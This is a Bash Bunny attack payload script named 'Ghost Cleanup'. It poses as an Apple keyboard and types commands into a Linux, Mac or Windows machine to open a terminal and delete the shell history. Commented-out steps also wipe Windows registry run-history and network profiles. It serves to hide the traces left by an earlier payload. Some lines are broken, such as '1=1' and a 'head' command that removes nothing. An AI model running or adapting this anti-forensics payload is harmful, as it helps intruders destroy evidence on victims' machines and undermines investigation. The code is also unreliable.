#!/bin/bash
#
# Title:         Ghost Cleanup
# Author:        bg-wa
# Version:       0.1
# Target:        Windows, Mac, Linux
# Props:         Hak5 E2124 - https://www.youtube.com/watch?v=qGPGOoJn54E
#
# Cleans the input history on Windows, Mac and Linux
#



#+++ CONFIG +++

LINES=0 # EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : 0 = ALL
OS="UNITY" # OPTIONS: "UNITY", "MAC", OR "WINDOWS"
UNMOUNT=false

DEBUG=false

#+++ END CONFIG +++



# GHOST CLEANUP
#

# DEBUG
DEBUG_FILE="/dev/null/"
if [ "${DEBUG}" = "true" ]; then
    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
      mkdir /root/udisk/loot
      mkdir /root/udisk/loot/ghost_cleanup
    fi
    touch "${DEBUG_FILE}"
    echo "DEBUG STARTED" >> "${DEBUG_FILE}"
fi
# END DEBUG


# PLATFORM CHECK
# FOR DYNAMIC SWITCHING, CREATE FILE '/root/udisk/loot/ghost_cleanup/os_windows' IN YOUR FIRST PAYLOAD.
if [ -f "/root/udisk/loot/ghost_cleanup/os_windows" ]; then
    OS="WINDOWS"
fi
if [ -f "/root/udisk/loot/ghost_cleanup/os_mac" ]; then
    OS="MAC"
fi
if [ -f "/root/udisk/loot/ghost_cleanup/os_unity" ]; then
    OS="UNITY"
fi
echo "${OS}" >> "${DEBUG_FILE}"
# END PLATFORM CHECK


# INIT FUNCTIONS
clear_active_input()
{
    QUACK DELAY 50
    QUACK BACKSPACE
    QUACK DELAY 100
}

wait_enter_wait()
{
    if [ -z "$1" ]; then
        BEFORE_WAIT=100
    else
        BEFORE_WAIT=$1
    fi
    if [ -z "$2" ]; then
        AFTER_WAIT=100
    else
        AFTER_WAIT=$2
    fi
    echo "${BEFORE_WAIT}" >> "${DEBUG_FILE}"
    echo "${AFTER_WAIT}" >> "${DEBUG_FILE}"

    QUACK DELAY ${BEFORE_WAIT}
    QUACK ENTER
    QUACK DELAY ${AFTER_WAIT}
}

clear_history_from_terminal()
{
    if [ "$LINES" -gt "0" ]; then
        QUACK STRING head -n -$LINES \$HOME/.bash_history
        wait_enter_wait
        QUACK STRING history -c
        wait_enter_wait
    else
        QUACK STRING rm \$HOME/.bash_history
        wait_enter_wait
        QUACK STRING history -c
        wait_enter_wait
    fi
    echo "HISTORY CLEARED FROM TERMINAL" >> "${DEBUG_FILE}"
}

clear_history_from_powershell()
{
    if [ "$LINES" -gt "0" ]; then
#        QUACK STRING setlocal enableextensions enabledelayedexpansion
#        QUACK ENTER
#        QUACK DELAY 200
#        QUACK STRING set len="${LINES}"
#        QUACK ENTER
#        QUACK DELAY 200
#        QUACK STRING set /a len_pos=%len%-1
#        QUACK ENTER
#        QUACK DELAY 200
#        QUACK STRING for /f "tokens=2*" %%a in ('reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /v MRUList') do set "mru=%%b"
#        QUACK ENTER
#        QUACK DELAY 200
#        QUACK STRING for /f %%c in ('cmd /u /v /q /c"(echo(!mru!)" ^| find /v "" ^| findstr /r /c:"[a-z]" ^| find /c /v ""') do set "str_len=%%c"
#        QUACK ENTER
#        QUACK DELAY 200
#        # Get the last Nr of defined lines from MRUList
#        QUACK STRING set list=!mru:~0,%len%!
#        QUACK ENTER
#        QUACK DELAY 200
#        # Set the new MRUList
#        QUACK STRING set original_list=!mru:~%len%,%str_len%!
#        QUACK ENTER
#        QUACK DELAY 200
#        # Delete old MRUList
#        QUACK STRING reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /f
#        QUACK ENTER
#        QUACK DELAY 200
#        # Add new MRUList
#        QUACK STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /t Reg_Sz /d %original_list%
#        QUACK ENTER
#        QUACK DELAY 200
#        # Delete the last Nr of lines from Registry
#        QUACK STRING for /l %%d in (0,1,%len_pos%) do (reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v !list:~%%d,1! /f)
#        QUACK ENTER
#        QUACK DELAY 200
        1=1
    else
        0=0
#        QUACK STRING reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
#        QUACK ENTER
#        QUACK DELAY 200
    fi
    echo "HISTORY CLEARED FROM POWERSHELL" >> "${DEBUG_FILE}"
}

unmount_drive_from_mac()
{
    # QUACK STRING diskutil unmount /Volumes/BashBunny
    # if lines > 0; lines + 1
    1=1
}

remove_windows_network_adapters()
{
    1=1
    # QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
    # QUACK ENTER
    # QUACK DELAY 100

    # REMOVE EXTRA ETHERNET CONNECTIONS
    # QUACK STRING netsh show profiles
    # QUACK ENTER
    # QUACK DELAY 100
    # todo ADAPTER=Get last ethernet adapter
    # QUACK ENTER
    # QUACK STRING netsh delete profile interface= $ADAPTER
    # QUACK ENTER
    # QUACK DELAY 100
}

echo "FUNCTIONS LOADED" >> "${DEBUG_FILE}"
# END FUNCTIONS


# START CLEANUP
LED R

ATTACKMODE HID VID_0X05AC PID_0X021E
QUACK DELAY 500

#UNITY
if [ "${OS}" = "UNITY" ]; then
    LED R B 100
    QUACK GUI
    clear_active_input
    QUACK STRING terminal
    wait_enter_wait 1000 2000

    #++ INSERT CUSTOM UNITY CLEANUP HERE ++


    #++ END CUSTOM UNITY CLEANUP

    clear_history_from_terminal
fi


#MAC
if [ "${OS}" = "MAC" ]; then
    LED R B G 100
    QUACK GUI SPACE
    clear_active_input
    QUACK STRING terminal
    wait_enter_wait 200 1000

    #++ INSERT CUSTOM MAC CLEANUP HERE ++


    #++ END CUSTOM MAC CLEANUP
    unmount_drive_from_mac
    clear_history_from_terminal
fi


#Windows
if [ "${OS}" = "WINDOWS" ]; then
    LED B 100
    QUACK GUI r
    clear_active_input
    QUACK STRING powershell
    wait_enter_wait 200 1000

    #++ INSERT CUSTOM WINDOWS CLEANUP HERE ++


    #++ END CUSTOM WINDOWS CLEANUP

    clear_history_from_powershell
fi

QUACK STRING exit
wait_enter_wait

LED G
# CLEANUP FINISHED
